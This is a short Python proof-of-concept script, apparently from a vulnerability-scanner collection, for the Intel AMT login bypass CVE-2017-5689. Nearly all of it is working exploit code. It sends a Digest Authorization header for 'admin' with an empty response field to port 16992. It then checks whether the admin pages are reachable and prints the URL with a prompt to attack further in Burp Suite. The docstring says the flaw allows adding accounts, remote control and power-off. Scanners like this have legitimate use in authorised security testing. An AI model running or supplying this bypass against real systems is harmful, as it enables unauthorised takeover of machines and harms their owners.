#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: intel AMT web系统绕过登录(CVE-2017-5689)
referer: http://mt.sohu.com/20170508/n492234893.shtml
author: Lucifer
description: intel芯片存在加密绕过的漏洞，攻击者通过将response置空即可绕过，可以远程添加账户，远程控制，关闭电源。
'''
import re
import sys
import random
import string
import requests
import warnings
from termcolor import cprint

class intel_amt_crypt_bypass_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }

        port = 16992
        payload = "/hw-sys.htm"
        vulnurl = self.url + ":"+ str(port) +payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            header_string = req.headers['WWW-Authenticate']
            pattern = 'realm="([^"]+)"'
            realm = re.search(pattern, header_string).group(1)
            pattern = 'nonce="([^"]+)"'
            nonce = re.search(pattern, header_string).group(1)
            cnonce = ''.join(random.sample(string.ascii_letters + string.digits, 16))
            headers2 = {
                "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                'Authorization':'Digest username="admin", realm="'+realm+'", nonce="'+nonce+'", uri="/index.htm?", response="", qop=auth, nc=00000001, cnonce="'+cnonce+'"'
            }
            req2 = requests.get(vulnurl, headers=headers2, timeout=10, verify=False)
            if r"href=remote.htm" in req2.text and r"href=hw-sys.htm" in req2.text:
                cprint("[+]存在intel AMT web系统绕过登录(CVE-2017-5689)漏洞...(高危)\tpayload: "+vulnurl+"\t在burpsuite中撸它", "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = intel_amt_crypt_bypass_BaseVerify(sys.argv[1])
    testVuln.run()
